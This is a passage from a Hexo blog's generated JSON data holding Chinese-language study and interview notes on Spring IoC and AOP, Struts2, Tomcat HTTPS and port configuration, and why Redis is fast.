title=\"Spring创建出对象的五种状态（Scope属性）\"></a>Spring创建出对象的五种状态（Scope属性）</h4><p><img src=\"Spring面试总结/7.png\" alt=\"什么是Spring\"></p>\n<h4 id=\"Spring中Bean的生命周期\"><a href=\"#Spring中Bean的生命周期\" class=\"headerlink\" title=\"Spring中Bean的生命周期\"></a>Spring中Bean的生命周期</h4><p>&emsp;&emsp;如果Bean是单利的（Spring默认的配置方式），则只初始化初始化一次，不会消亡，只有当Spring的IOC容器关闭的时候才会销毁Bean对象<br>如果Bean是非单利的，则Bean对象不由Spring的IOC容器管理，由JVM的垃圾回收机制收回，创建的时候，每次使用都会创建一个新的对象</p>\n<h4 id=\"Spring的属性注入\"><a href=\"#Spring的属性注入\" class=\"headerlink\" title=\"Spring的属性注入\"></a>Spring的属性注入</h4><p>&emsp;&emsp;Autowired默认是按照类型进行注入的<br>当Autowired + Qualifier(“name”) 是按照名称进行注入，其中name必须写</p>\n<h4 id=\"面向切面编程AOP理解\"><a href=\"#面向切面编程AOP理解\" class=\"headerlink\" title=\"面向切面编程AOP理解\"></a>面向切面编程AOP理解</h4><p>&emsp;&emsp;AOP是一种编程范式，由AOP联盟提出用来弥补oop的不足。传统的oop关注的是纵向编程，而AOP关注的是将同一层面上共性的部分抽取出来形成独立的模块，<br>&emsp;&emsp;在程序的执行阶段又动态的添加进去，组成完整的业务代码。</p>\n<h4 id=\"AOP的基本概念\"><a href=\"#AOP的基本概念\" class=\"headerlink\" title=\"AOP的基本概念\"></a>AOP的基本概念</h4><p><strong>目标类:</strong><br>&emsp;&emsp;需要被增强的类（原始类）叫做目标类，由目标类创建的对象叫做目标对象<br><strong>连接点:</strong><br>&emsp;&emsp;目标类中所有的方法（的执行）叫做连接点<br><strong>切入点:</strong><br>&emsp;&emsp;目标类中具有共性功能的方法（的执行）叫做切入点<br><strong>通知:</strong><br>&emsp;&emsp;将共性功能抽取到一个类中叫做通知类，共性模块叫做通知<br><strong>AOP代理:</strong><br>&emsp;&emsp;抽取后的类创建的对象不能在完成相应的功能，这时候就需要创建一个AOP代理对象完成完整的业务功能，创建AOP代理对象的过程叫做AOP代理<br><strong>织入:</strong><br>&emsp;&emsp;将增强的共性功能添加到切入点的过程叫做织入<br><strong>织入的时机:</strong><br><img src=\"Spring面试总结/8.png\" alt=\"什么是Spring\"><br><strong>切面:</strong><br>&emsp;&emsp;通知和切入点之间的对应关系叫做切面（从数学的角度点与点之间的连线形成线，多条线形成面</p>\n<h4 id=\"面向切面配置\"><a href=\"#面向切面配置\" class=\"headerlink\" title=\"面向切面配置\"></a>面向切面配置</h4><p><img src=\"Spring面试总结/9.png\" alt=\"什么是Spring\"></p>\n<h4 id=\"AOP通知的5种类型\"><a href=\"#AOP通知的5种类型\" class=\"headerlink\" title=\"AOP通知的5种类型\"></a>AOP通知的5种类型</h4><p><img src=\"Spring面试总结/10.png\" alt=\"什么是Spring\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"什么是Spring\"><a href=\"#什么是Spring\" class=\"headerlink\" title=\"什么是Spring\"></a>什么是Spring</h4><p><img src=\"Spring面试总结/1.png\" alt=\"什么是Spring\"><br><img src=\"Spring面试总结/2.png\" alt=\"什么是Spring\"></p>\n<h4 id=\"Spring控制反转IOC\"><a href=\"#Spring控制反转IOC\" class=\"headerlink\" title=\"Spring控制反转IOC\"></a>Spring控制反转IOC</h4><p><img src=\"Spring面试总结/3.png\" alt=\"什么是Spring\"><br><img src=\"Spring面试总结/4.png\" alt=\"什么是Spring\"></p>\n<h4 id=\"Spring的依赖注入DI\"><a href=\"#Spring的依赖注入DI\" class=\"headerlink\" title=\"Spring的依赖注入DI\"></a>Spring的依赖注入DI</h4><p>&emsp;&emsp;应用程序依赖Spring为其注入资源叫做依赖注入.当Spring为Bean注入属性的时候，基本数据类型，基本数据类型包装类，String用的是value，其他的引用数据类型用的是ref</p>\n<h4 id=\"IOC和DI之间的关系\"><a href=\"#IOC和DI之间的关系\" class=\"headerlink\" title=\"IOC和DI之间的关系\"></a>IOC和DI之间的关系</h4><p><img src=\"Spring面试总结/5.png\" alt=\"什么是Spring\"></p>\n<h4 id=\"ApplicationContex与BeanFactory之间的关系\"><a href=\"#ApplicationContex与BeanFactory之间的关系\" class=\"headerlink\" title=\"ApplicationContex与BeanFactory之间的关系\"></a>ApplicationContex与BeanFactory之间的关系</h4><p>&emsp;&emsp;getBean方法其实是在BeanFactory中,applicationContext初始化Bean的对象默认情况下是立即加载，<br>&emsp;&emsp;BeanFactory初始化Bean默认的情况下是延迟加载，只有用到Bean的时候才会初始化对象.applicationContext是BeanFactory的子接口,功能比BeanFactory更加强大</p>\n<p><img src=\"Spring面试总结/6.png\" alt=\"什么是Spring\"></p>\n<h4 id=\"Spring中Bean的初始化\"><a href=\"#Spring中Bean的初始化\" class=\"headerlink\" title=\"Spring中Bean的初始化\"></a>Spring中Bean的初始化</h4><p>1.构造器初始化,需要一个无参数的构造器<br>2.静态工厂初始化</p>\n<pre><code>&lt;bean factory-method=”” class=””&gt;&lt;/bean&gt;\n</code></pre><p>3.实例工厂初始化</p>\n<pre><code>&lt;bean factory-method=”” factory-bean=””&gt;&lt;/bean&gt;\n</code></pre><h4 id=\"Spring创建出对象的五种状态（Scope属性）\"><a href=\"#Spring创建出对象的五种状态（Scope属性）\" class=\"headerlink\" title=\"Spring创建出对象的五种状态（Scope属性）\"></a>Spring创建出对象的五种状态（Scope属性）</h4><p><img src=\"Spring面试总结/7.png\" alt=\"什么是Spring\"></p>\n<h4 id=\"Spring中Bean的生命周期\"><a href=\"#Spring中Bean的生命周期\" class=\"headerlink\" title=\"Spring中Bean的生命周期\"></a>Spring中Bean的生命周期</h4><p>&emsp;&emsp;如果Bean是单利的（Spring默认的配置方式），则只初始化初始化一次，不会消亡，只有当Spring的IOC容器关闭的时候才会销毁Bean对象<br>如果Bean是非单利的，则Bean对象不由Spring的IOC容器管理，由JVM的垃圾回收机制收回，创建的时候，每次使用都会创建一个新的对象</p>\n<h4 id=\"Spring的属性注入\"><a href=\"#Spring的属性注入\" class=\"headerlink\" title=\"Spring的属性注入\"></a>Spring的属性注入</h4><p>&emsp;&emsp;Autowired默认是按照类型进行注入的<br>当Autowired + Qualifier(“name”) 是按照名称进行注入，其中name必须写</p>\n<h4 id=\"面向切面编程AOP理解\"><a href=\"#面向切面编程AOP理解\" class=\"headerlink\" title=\"面向切面编程AOP理解\"></a>面向切面编程AOP理解</h4><p>&emsp;&emsp;AOP是一种编程范式，由AOP联盟提出用来弥补oop的不足。传统的oop关注的是纵向编程，而AOP关注的是将同一层面上共性的部分抽取出来形成独立的模块，<br>&emsp;&emsp;在程序的执行阶段又动态的添加进去，组成完整的业务代码。</p>\n<h4 id=\"AOP的基本概念\"><a href=\"#AOP的基本概念\" class=\"headerlink\" title=\"AOP的基本概念\"></a>AOP的基本概念</h4><p><strong>目标类:</strong><br>&emsp;&emsp;需要被增强的类（原始类）叫做目标类，由目标类创建的对象叫做目标对象<br><strong>连接点:</strong><br>&emsp;&emsp;目标类中所有的方法（的执行）叫做连接点<br><strong>切入点:</strong><br>&emsp;&emsp;目标类中具有共性功能的方法（的执行）叫做切入点<br><strong>通知:</strong><br>&emsp;&emsp;将共性功能抽取到一个类中叫做通知类，共性模块叫做通知<br><strong>AOP代理:</strong><br>&emsp;&emsp;抽取后的类创建的对象不能在完成相应的功能，这时候就需要创建一个AOP代理对象完成完整的业务功能，创建AOP代理对象的过程叫做AOP代理<br><strong>织入:</strong><br>&emsp;&emsp;将增强的共性功能添加到切入点的过程叫做织入<br><strong>织入的时机:</strong><br><img src=\"Spring面试总结/8.png\" alt=\"什么是Spring\"><br><strong>切面:</strong><br>&emsp;&emsp;通知和切入点之间的对应关系叫做切面（从数学的角度点与点之间的连线形成线，多条线形成面</p>\n<h4 id=\"面向切面配置\"><a href=\"#面向切面配置\" class=\"headerlink\" title=\"面向切面配置\"></a>面向切面配置</h4><p><img src=\"Spring面试总结/9.png\" alt=\"什么是Spring\"></p>\n<h4 id=\"AOP通知的5种类型\"><a href=\"#AOP通知的5种类型\" class=\"headerlink\" title=\"AOP通知的5种类型\"></a>AOP通知的5种类型</h4><p><img src=\"Spring面试总结/10.png\" alt=\"什么是Spring\"></p>\n"},{"title":"Struts2文件上传","date":"2014-01-31T06:48:28.000Z","_content":"![Struts2](Struts2文件上传/1.png)","source":"_posts/Struts2文件上传.md","raw":"---\ntitle: Struts2文件上传\ndate: 2014-01-31 14:48:28\ntags: Struts2\n---\n![Struts2](Struts2文件上传/1.png)","slug":"Struts2文件上传","published":1,"updated":"2018-01-31T06:49:16.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44twk0023mfahu697ntej","content":"<p><img src=\"Struts2文件上传/1.png\" alt=\"Struts2\"></p>\n","site":{"data":{}},"excerpt":"","more":"<p><img src=\"Struts2文件上传/1.png\" alt=\"Struts2\"></p>\n"},{"title":"Tomcat优化","date":"2017-01-31T01:00:25.000Z","_content":"\n#### Tomcat优化\n\n1. Tomcat的优化方案:\n\n          1.配置支持HTTPS协议\n          2.配置NIO\n          3.配置Tomcat压缩静态文件\n          4.配置最大线程数\n          5.配置线程池\n\n2. Tomcat配置HTTPS方法:\n\n            1.生成安全证书, keytool -genkeypair -alias \"tomcat\" -keyalg \"RSA\" -keystore \"f:\\tomcat.keystore\"  \n            2.配置tomcat\n               <Connector port=\"8443\" protocol=\"HTTP/1.1\" SSLEnabled=\"true\"  \n               maxThreads=\"150\" scheme=\"https\" secure=\"true\"  \n               clientAuth=\"false\" sslProtocol=\"TLS\"   \n               keystoreFile=\"D:\\Tools\\Web\\ssl\\tomcat.keystore\"  \n               keystorePass=\"tomcat\"  \n               ciphers=\"tomcat\"/>  ","source":"_posts/Tomcat优化.md","raw":"---\ntitle: Tomcat优化\ndate: 2017-01-31 09:00:25\ntags: Tomcat\n---\n\n#### Tomcat优化\n\n1. Tomcat的优化方案:\n\n          1.配置支持HTTPS协议\n          2.配置NIO\n          3.配置Tomcat压缩静态文件\n          4.配置最大线程数\n          5.配置线程池\n\n2. Tomcat配置HTTPS方法:\n\n            1.生成安全证书, keytool -genkeypair -alias \"tomcat\" -keyalg \"RSA\" -keystore \"f:\\tomcat.keystore\"  \n            2.配置tomcat\n               <Connector port=\"8443\" protocol=\"HTTP/1.1\" SSLEnabled=\"true\"  \n               maxThreads=\"150\" scheme=\"https\" secure=\"true\"  \n               clientAuth=\"false\" sslProtocol=\"TLS\"   \n               keystoreFile=\"D:\\Tools\\Web\\ssl\\tomcat.keystore\"  \n               keystorePass=\"tomcat\"  \n               ciphers=\"tomcat\"/>  ","slug":"Tomcat优化","published":1,"updated":"2018-01-31T05:18:22.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44twl0025mfah73bffqsg","content":"<h4 id=\"Tomcat优化\"><a href=\"#Tomcat优化\" class=\"headerlink\" title=\"Tomcat优化\"></a>Tomcat优化</h4><ol>\n<li><p>Tomcat的优化方案:</p>\n<pre><code>1.配置支持HTTPS协议\n2.配置NIO\n3.配置Tomcat压缩静态文件\n4.配置最大线程数\n5.配置线程池\n</code></pre></li>\n<li><p>Tomcat配置HTTPS方法:</p>\n<pre><code>1.生成安全证书, keytool -genkeypair -alias &quot;tomcat&quot; -keyalg &quot;RSA&quot; -keystore &quot;f:\\tomcat.keystore&quot;  \n2.配置tomcat\n   &lt;Connector port=&quot;8443&quot; protocol=&quot;HTTP/1.1&quot; SSLEnabled=&quot;true&quot;  \n   maxThreads=&quot;150&quot; scheme=&quot;https&quot; secure=&quot;true&quot;  \n   clientAuth=&quot;false&quot; sslProtocol=&quot;TLS&quot;   \n   keystoreFile=&quot;D:\\Tools\\Web\\ssl\\tomcat.keystore&quot;  \n   keystorePass=&quot;tomcat&quot;  \n   ciphers=&quot;tomcat&quot;/&gt;  \n</code></pre></li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"Tomcat优化\"><a href=\"#Tomcat优化\" class=\"headerlink\" title=\"Tomcat优化\"></a>Tomcat优化</h4><ol>\n<li><p>Tomcat的优化方案:</p>\n<pre><code>1.配置支持HTTPS协议\n2.配置NIO\n3.配置Tomcat压缩静态文件\n4.配置最大线程数\n5.配置线程池\n</code></pre></li>\n<li><p>Tomcat配置HTTPS方法:</p>\n<pre><code>1.生成安全证书, keytool -genkeypair -alias &quot;tomcat&quot; -keyalg &quot;RSA&quot; -keystore &quot;f:\\tomcat.keystore&quot;  \n2.配置tomcat\n   &lt;Connector port=&quot;8443&quot; protocol=&quot;HTTP/1.1&quot; SSLEnabled=&quot;true&quot;  \n   maxThreads=&quot;150&quot; scheme=&quot;https&quot; secure=&quot;true&quot;  \n   clientAuth=&quot;false&quot; sslProtocol=&quot;TLS&quot;   \n   keystoreFile=&quot;D:\\Tools\\Web\\ssl\\tomcat.keystore&quot;  \n   keystorePass=&quot;tomcat&quot;  \n   ciphers=&quot;tomcat&quot;/&gt;  \n</code></pre></li>\n</ol>\n"},{"title":"Struts2面试总结","date":"2017-09-18T15:27:41.000Z","_content":"#### Struts2执行流程:\n\n![Struts2面试总结](Struts2面试总结/1.png)\n\n\t1.客户端发送HTTP请求到前端控制器StrutsPrepareAndExcetFilter,前端控制器看是不是Action\n\t2.如果是不是Action放行,如果是Action则查找ActionMapper,返回前端控制器\n\t3.前端控制器创建ActionProxy\n\t4.经过Action Invocation管理的一堆拦截器后代理对象执行Action,\n\t5.将执行结果返回模板(JSP.Freemarker),渲染视图,返回客户端\n\n#### Struts2是如何启动的\n          Struts2是通过StrutsPrepareAndExcutFilter进行启动的,当我们开启服务器的时候,前端控制器会执行,从而执行init方法.此方法中会加载struts.xml\n          配置文件,读取配置的Bean在内存中,当以后再需要Bean的时候从内存中读取\n\n#### Struts-default默认包的作用\n\tStruts-default默认包是Struts2中内置的,内部定义了许多的拦截器,比如参数封装,模型驱动,文件上传.Struts-deult包是在Striuts-default.xml中定义,Struts-defalut.xml\n\t中不仅仅定义了一堆有用的拦截器,还定义了结果类型,拦截器栈,一般我们的package都要继承struts-default包\n\n#### Struts2是单利的吗\n\tStruts2不是单利的,每个请求都会产生一个实例,类级别的线程安全\n\n#### Struts2如何访问Servlet API\n\t1.通过ActionContext获取三个域对象,request,session,application\n\t2.通过ActionContext的子类ServletActionContext\n\t3.通过ServletAware一些接口获取\n\n#### Struts2中常见的拦截器\n\t  ModelDriven,FileUpload,parameters,Session,TockSession,Exception,validator\n\n#### Struts2常见的几种结果类型\n\tdispatcher:转发到jsp(默认)\n\tchain:转发到Action\n\tredirect:重定向到jsp\n\tredisrectAction:重定向到Action\n\tstream:流","source":"_posts/Struts2面试总结.md","raw":"---\ntitle: Struts2面试总结\ndate: 2017-9-18 23:27:41\ntags: Struts2\n---\n#### Struts2执行流程:\n\n![Struts2面试总结](Struts2面试总结/1.png)\n\n\t1.客户端发送HTTP请求到前端控制器StrutsPrepareAndExcetFilter,前端控制器看是不是Action\n\t2.如果是不是Action放行,如果是Action则查找ActionMapper,返回前端控制器\n\t3.前端控制器创建ActionProxy\n\t4.经过Action Invocation管理的一堆拦截器后代理对象执行Action,\n\t5.将执行结果返回模板(JSP.Freemarker),渲染视图,返回客户端\n\n#### Struts2是如何启动的\n          Struts2是通过StrutsPrepareAndExcutFilter进行启动的,当我们开启服务器的时候,前端控制器会执行,从而执行init方法.此方法中会加载struts.xml\n          配置文件,读取配置的Bean在内存中,当以后再需要Bean的时候从内存中读取\n\n#### Struts-default默认包的作用\n\tStruts-default默认包是Struts2中内置的,内部定义了许多的拦截器,比如参数封装,模型驱动,文件上传.Struts-deult包是在Striuts-default.xml中定义,Struts-defalut.xml\n\t中不仅仅定义了一堆有用的拦截器,还定义了结果类型,拦截器栈,一般我们的package都要继承struts-default包\n\n#### Struts2是单利的吗\n\tStruts2不是单利的,每个请求都会产生一个实例,类级别的线程安全\n\n#### Struts2如何访问Servlet API\n\t1.通过ActionContext获取三个域对象,request,session,application\n\t2.通过ActionContext的子类ServletActionContext\n\t3.通过ServletAware一些接口获取\n\n#### Struts2中常见的拦截器\n\t  ModelDriven,FileUpload,parameters,Session,TockSession,Exception,validator\n\n#### Struts2常见的几种结果类型\n\tdispatcher:转发到jsp(默认)\n\tchain:转发到Action\n\tredirect:重定向到jsp\n\tredisrectAction:重定向到Action\n\tstream:流","slug":"Struts2面试总结","published":1,"updated":"2018-01-31T05:24:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44twl0027mfahpw4074km","content":"<h4 id=\"Struts2执行流程\"><a href=\"#Struts2执行流程\" class=\"headerlink\" title=\"Struts2执行流程:\"></a>Struts2执行流程:</h4><p><img src=\"Struts2面试总结/1.png\" alt=\"Struts2面试总结\"></p>\n<pre><code>1.客户端发送HTTP请求到前端控制器StrutsPrepareAndExcetFilter,前端控制器看是不是Action\n2.如果是不是Action放行,如果是Action则查找ActionMapper,返回前端控制器\n3.前端控制器创建ActionProxy\n4.经过Action Invocation管理的一堆拦截器后代理对象执行Action,\n5.将执行结果返回模板(JSP.Freemarker),渲染视图,返回客户端\n</code></pre><h4 id=\"Struts2是如何启动的\"><a href=\"#Struts2是如何启动的\" class=\"headerlink\" title=\"Struts2是如何启动的\"></a>Struts2是如何启动的</h4><pre><code>Struts2是通过StrutsPrepareAndExcutFilter进行启动的,当我们开启服务器的时候,前端控制器会执行,从而执行init方法.此方法中会加载struts.xml\n配置文件,读取配置的Bean在内存中,当以后再需要Bean的时候从内存中读取\n</code></pre><h4 id=\"Struts-default默认包的作用\"><a href=\"#Struts-default默认包的作用\" class=\"headerlink\" title=\"Struts-default默认包的作用\"></a>Struts-default默认包的作用</h4><pre><code>Struts-default默认包是Struts2中内置的,内部定义了许多的拦截器,比如参数封装,模型驱动,文件上传.Struts-deult包是在Striuts-default.xml中定义,Struts-defalut.xml\n中不仅仅定义了一堆有用的拦截器,还定义了结果类型,拦截器栈,一般我们的package都要继承struts-default包\n</code></pre><h4 id=\"Struts2是单利的吗\"><a href=\"#Struts2是单利的吗\" class=\"headerlink\" title=\"Struts2是单利的吗\"></a>Struts2是单利的吗</h4><pre><code>Struts2不是单利的,每个请求都会产生一个实例,类级别的线程安全\n</code></pre><h4 id=\"Struts2如何访问Servlet-API\"><a href=\"#Struts2如何访问Servlet-API\" class=\"headerlink\" title=\"Struts2如何访问Servlet API\"></a>Struts2如何访问Servlet API</h4><pre><code>1.通过ActionContext获取三个域对象,request,session,application\n2.通过ActionContext的子类ServletActionContext\n3.通过ServletAware一些接口获取\n</code></pre><h4 id=\"Struts2中常见的拦截器\"><a href=\"#Struts2中常见的拦截器\" class=\"headerlink\" title=\"Struts2中常见的拦截器\"></a>Struts2中常见的拦截器</h4><pre><code>ModelDriven,FileUpload,parameters,Session,TockSession,Exception,validator\n</code></pre><h4 id=\"Struts2常见的几种结果类型\"><a href=\"#Struts2常见的几种结果类型\" class=\"headerlink\" title=\"Struts2常见的几种结果类型\"></a>Struts2常见的几种结果类型</h4><pre><code>dispatcher:转发到jsp(默认)\nchain:转发到Action\nredirect:重定向到jsp\nredisrectAction:重定向到Action\nstream:流\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"Struts2执行流程\"><a href=\"#Struts2执行流程\" class=\"headerlink\" title=\"Struts2执行流程:\"></a>Struts2执行流程:</h4><p><img src=\"Struts2面试总结/1.png\" alt=\"Struts2面试总结\"></p>\n<pre><code>1.客户端发送HTTP请求到前端控制器StrutsPrepareAndExcetFilter,前端控制器看是不是Action\n2.如果是不是Action放行,如果是Action则查找ActionMapper,返回前端控制器\n3.前端控制器创建ActionProxy\n4.经过Action Invocation管理的一堆拦截器后代理对象执行Action,\n5.将执行结果返回模板(JSP.Freemarker),渲染视图,返回客户端\n</code></pre><h4 id=\"Struts2是如何启动的\"><a href=\"#Struts2是如何启动的\" class=\"headerlink\" title=\"Struts2是如何启动的\"></a>Struts2是如何启动的</h4><pre><code>Struts2是通过StrutsPrepareAndExcutFilter进行启动的,当我们开启服务器的时候,前端控制器会执行,从而执行init方法.此方法中会加载struts.xml\n配置文件,读取配置的Bean在内存中,当以后再需要Bean的时候从内存中读取\n</code></pre><h4 id=\"Struts-default默认包的作用\"><a href=\"#Struts-default默认包的作用\" class=\"headerlink\" title=\"Struts-default默认包的作用\"></a>Struts-default默认包的作用</h4><pre><code>Struts-default默认包是Struts2中内置的,内部定义了许多的拦截器,比如参数封装,模型驱动,文件上传.Struts-deult包是在Striuts-default.xml中定义,Struts-defalut.xml\n中不仅仅定义了一堆有用的拦截器,还定义了结果类型,拦截器栈,一般我们的package都要继承struts-default包\n</code></pre><h4 id=\"Struts2是单利的吗\"><a href=\"#Struts2是单利的吗\" class=\"headerlink\" title=\"Struts2是单利的吗\"></a>Struts2是单利的吗</h4><pre><code>Struts2不是单利的,每个请求都会产生一个实例,类级别的线程安全\n</code></pre><h4 id=\"Struts2如何访问Servlet-API\"><a href=\"#Struts2如何访问Servlet-API\" class=\"headerlink\" title=\"Struts2如何访问Servlet API\"></a>Struts2如何访问Servlet API</h4><pre><code>1.通过ActionContext获取三个域对象,request,session,application\n2.通过ActionContext的子类ServletActionContext\n3.通过ServletAware一些接口获取\n</code></pre><h4 id=\"Struts2中常见的拦截器\"><a href=\"#Struts2中常见的拦截器\" class=\"headerlink\" title=\"Struts2中常见的拦截器\"></a>Struts2中常见的拦截器</h4><pre><code>ModelDriven,FileUpload,parameters,Session,TockSession,Exception,validator\n</code></pre><h4 id=\"Struts2常见的几种结果类型\"><a href=\"#Struts2常见的几种结果类型\" class=\"headerlink\" title=\"Struts2常见的几种结果类型\"></a>Struts2常见的几种结果类型</h4><pre><code>dispatcher:转发到jsp(默认)\nchain:转发到Action\nredirect:重定向到jsp\nredisrectAction:重定向到Action\nstream:流\n</code></pre>"},{"title":"Redis为什么快","date":"2018-03-28T00:28:49.000Z","_content":"\n### 简介\nRedis是一个单进程、单线程的NOSQL数据库，但是官方却声称，Redis可以实现100000+的QPS，实践证明确实可以达到如此快的速度。那么一个单线程单进程的数据库是如何实现如此快的查询呢？\n\n### Redis快的原因\n- Redis是一个基于内存的数据库\n大家都知道内存的读写数据速度是非常快的，那么实际上到底有多快呢？小编也没有测过，从互联网上抄来一组数据来说明一下问题：\n![](https://ws2.sinaimg.cn/large/006tNc79ly1fps8z90i89j30hs09i3z6.jpg)\n- Redis采用的是Key/Value形式的存储结构\nKey/Value形式的数据形式在读取和写入的时候都比较简单，能进行快速的查询。\n- Redis采用了多IO复用机制\n\n","source":"_posts/Redis为什么快.md","raw":"---\ntitle: Redis为什么快\ndate: 2018-03-28 08:28:49\ntags: Redis\n---\n\n### 简介\nRedis是一个单进程、单线程的NOSQL数据库，但是官方却声称，Redis可以实现100000+的QPS，实践证明确实可以达到如此快的速度。那么一个单线程单进程的数据库是如何实现如此快的查询呢？\n\n### Redis快的原因\n- Redis是一个基于内存的数据库\n大家都知道内存的读写数据速度是非常快的，那么实际上到底有多快呢？小编也没有测过，从互联网上抄来一组数据来说明一下问题：\n![](https://ws2.sinaimg.cn/large/006tNc79ly1fps8z90i89j30hs09i3z6.jpg)\n- Redis采用的是Key/Value形式的存储结构\nKey/Value形式的数据形式在读取和写入的时候都比较简单，能进行快速的查询。\n- Redis采用了多IO复用机制\n\n","slug":"Redis为什么快","published":1,"updated":"2018-03-28T00:56:07.496Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44twm002amfahn5iqipcz","content":"<h3 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h3><p>Redis是一个单进程、单线程的NOSQL数据库，但是官方却声称，Redis可以实现100000+的QPS，实践证明确实可以达到如此快的速度。那么一个单线程单进程的数据库是如何实现如此快的查询呢？</p>\n<h3 id=\"Redis快的原因\"><a href=\"#Redis快的原因\" class=\"headerlink\" title=\"Redis快的原因\"></a>Redis快的原因</h3><ul>\n<li>Redis是一个基于内存的数据库<br>大家都知道内存的读写数据速度是非常快的，那么实际上到底有多快呢？小编也没有测过，从互联网上抄来一组数据来说明一下问题：<br><img src=\"https://ws2.sinaimg.cn/large/006tNc79ly1fps8z90i89j30hs09i3z6.jpg\" alt=\"\"></li>\n<li>Redis采用的是Key/Value形式的存储结构<br>Key/Value形式的数据形式在读取和写入的时候都比较简单，能进行快速的查询。</li>\n<li>Redis采用了多IO复用机制</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h3><p>Redis是一个单进程、单线程的NOSQL数据库，但是官方却声称，Redis可以实现100000+的QPS，实践证明确实可以达到如此快的速度。那么一个单线程单进程的数据库是如何实现如此快的查询呢？</p>\n<h3 id=\"Redis快的原因\"><a href=\"#Redis快的原因\" class=\"headerlink\" title=\"Redis快的原因\"></a>Redis快的原因</h3><ul>\n<li>Redis是一个基于内存的数据库<br>大家都知道内存的读写数据速度是非常快的，那么实际上到底有多快呢？小编也没有测过，从互联网上抄来一组数据来说明一下问题：<br><img src=\"https://ws2.sinaimg.cn/large/006tNc79ly1fps8z90i89j30hs09i3z6.jpg\" alt=\"\"></li>\n<li>Redis采用的是Key/Value形式的存储结构<br>Key/Value形式的数据形式在读取和写入的时候都比较简单，能进行快速的查询。</li>\n<li>Redis采用了多IO复用机制</li>\n</ul>\n"},{"title":"Tomcat端口配置及原理详解","date":"2018-01-30T08:56:09.000Z","_content":"\n#### Tomcat 端口配置，及原理详解\n\n如果想深入了解tomcat的各个端口及配置，建议通读文章，对初学者十分有利，整理自网络。\n\nTomcat服务器需配置三个端口才能启动，安装时默认启用了这三个端口，当要运行多个tomcat服务时需要修改这三个端口，不能相同。端口配置路径为tomcat\\ conf\\service.xml\n\n修改Shutdown端口（默认为8005端口）\n```\n<Server port=\"8005\" shutdown=\"SHUTDOWN\">\n```\n\n修改http访问端口（默认为8080端口） \n负责建立HTTP连接。在通过浏览器访问Tomcat服务器的Web应用时，使用的就是这个连接器。\n``` \n<Connector port=\"8080\" protocol=\"HTTP/1.1\" connectionTimeout=\"20000\" redirectPort=\"8443\" /><!-- A \"Connector\" using the shared thread pool--><!-- <Connector executor=\"tomcatThreadPool\" port=\"8080\" protocol=\"HTTP/1.1\" connectionTimeout=\"20000\" redirectPort=\"8443\" />\n```\nAJP协议访问端口（默认为8009端口） \n负责和其他的HTTP服务器建立连接。在把Tomcat与其他HTTP服务器集成时，就需要用到这个连接器。\n\n```\n<!-- Define an AJP 1.3 Connector on port 8009 --><Connector port=\"8009\" protocol=\"AJP/1.3\" redirectPort=\"8443\" />\n```\nWeb客户访问Tomcat服务器上JSP组件的两种方式如图所示。\n\n![](Tomcat端口配置及原理详解/1.gif)","source":"_posts/Tomcat端口配置及原理详解.md","raw":"---\ntitle: Tomcat端口配置及原理详解\ndate: 2018-01-30 16:56:09\ntags: Tomcat\n---\n\n#### Tomcat 端口配置，及原理详解\n\n如果想深入了解tomcat的各个端口及配置，建议通读文章，对初学者十分有利，整理自网络。\n\nTomcat服务器需配置三个端口才能启动，安装时默认启用了这三个端口，当要运行多个tomcat服务时需要修改这三个端口，不能相同。端口配置路径为tomcat\\ conf\\service.xml\n\n修改Shutdown端口（默认为8005端口）\n```\n<Server port=\"8005\" shutdown=\"SHUTDOWN\">\n```\n\n修改http访问端口（默认为8080端口） \n负责建立HTTP连接。在通过浏览器访问Tomcat服务器的Web应用时，使用的就是这个连接器。\n``` \n<Connector port=\"8080\" protocol=\"HTTP/1.1\" connectionTimeout=\"20000\" redirectPort=\"8443\" /><!-- A \"Connector\" using the shared thread pool--><!-- <Connector executor=\"tomcatThreadPool\" port=\"8080\" protocol=\"HTTP/1.1\" connectionTimeout=\"20000\" redirectPort=\"8443\" />\n```\nAJP协议访问端口（默认为8009端口） \n负责和其他的HTTP服务器建立连接。在把Tomcat与其他HTTP服务器集成时，就需要用到这个连接器。\n\n```\n<!-- Define an AJP 1.3 Connector on port 8009 --><Connector port=\"8009\" protocol=\"AJP/1.3\" redirectPort=\"8443\" />\n```\nWeb客户访问Tomcat服务器上JSP组件的两种方式如图所示。\n\n![](Tomcat端口配置及原理详解/1.gif)","slug":"Tomcat端口配置及原理详解","published":1,"updated":"2018-01-30T09:03:32.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44twn002cmfahsvr4sz8k","content":"<h4 id=\"Tomcat-端口配置，及原理详解\"><a href=\"#Tomcat-端口配置，及原理详解\" class=\"headerlink\" title=\"Tomcat 端口配置，及原理详解\"></a>Tomcat 端口配置，及原理详解</h4><p>如果想深入了解tomcat的各个端口及配置，建议通读文章，对初学者十分有利，整理自网络。</p>\n<p>Tomcat服务器需配置三个端口才能启动，安装时默认启用了这三个端口，当要运行多个tomcat服务时需要修改这三个端口，不能相同。端口配置路径为tomcat\\ conf\\service.xml</p>\n<p>修改Shutdown端口（默认为8005端口）<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;Server port=&quot;8005&quot; shutdown=&quot;SHUTDOWN&quot;&gt;</span><br></pre></td></tr></table></figure></p>\n<p>修改http访问端口（默认为8080端口）<br>负责建立HTTP连接。在通过浏览器访问Tomcat服务器的Web应用时，使用的就是这个连接器。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot; connectionTimeout=&quot;20000&quot; redirectPort=&quot;8443&quot; /&gt;&lt;!-- A &quot;Connector&quot; using the shared thread pool--&gt;&lt;!-- &lt;Connector executor=&quot;tomcatThreadPool&quot; 